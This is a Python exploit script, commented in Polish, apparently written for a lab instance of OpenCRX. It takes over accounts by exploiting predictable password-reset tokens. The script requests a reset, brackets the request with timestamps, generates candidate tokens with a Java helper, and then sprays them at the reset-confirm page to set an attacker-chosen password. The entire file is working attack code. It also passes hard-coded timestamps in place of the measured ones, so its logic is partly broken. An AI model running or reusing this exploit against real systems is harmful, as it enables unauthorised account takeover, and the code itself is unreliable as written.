#!/usr/bin/python3

import requests
import argparse
import subprocess

def execute_bash_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Command '{command}' returned non-zero exit status {e.returncode}.")
        print(f"Error output:\n{e.stderr.decode('utf-8')}")
        return None


# Przykład użycia funkcji dla Twojego polecenia
def getEpochTime():
    command = "date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N"
    output = execute_bash_command(command)
    lines = output.split("\n")

    # Pobieramy wartości start i stop time
    start_time = lines[0].strip()
    stop_time = lines[-2].strip()  # ostatnia linia, bez pustego pola na końcu

    # Wyświetlamy wartości
    print(f"Start time: {start_time}")
    print(f"Stop time: {stop_time}")
    
    # Parsujemy do int (long w kontekście Java)
    start_time = int(start_time)
    stop_time = int(stop_time)

    # Zwracamy wartości jako krotka
    return start_time, stop_time

def generateTokens(startTime, stopTime):
    
    # Wywołanie funkcji
    createTokenFile()
    command = f"java OpenCRXToken {1720123249358} {1720123249658} > tokens.txt"
    try:
        subprocess.run(command, shell=True, check=True)
        print("Komenda Java została pomyślnie wykonana.")
    except subprocess.CalledProcessError as e:
        print(f"Błąd podczas wykonywania komendy Java: {e}")

def createTokenFile():
    file_name = "tokens.txt"
    try:
        with open(file_name, 'w') as file:
            pass  # Nie robimy żadnego zapisu, co spowoduje utworzenie pustego pliku
        print(f"Pusty plik '{file_name}' został pomyślnie utworzony.")
    except IOError:
        print(f"Wystąpił błąd podczas tworzenia pustego pliku '{file_name}'.")



def resetPassword():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--user', help='Username to target', required=True)
    parser.add_argument('-p','--password', help='Password value to set', required=True)
    args = parser.parse_args()

    target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

    print("Starting token spray. Standby.")
    with open("tokens.txt", "r") as f:
        for word in f:
            # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
            payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

            r = requests.post(url=target, data=payload)
            res = r.text

            if "Unable to reset password" not in res:
                print("Successful reset with token: %s" % word)
                break


startTime, stoptime = getEpochTime()
generateTokens(startTime, stoptime)
resetPassword()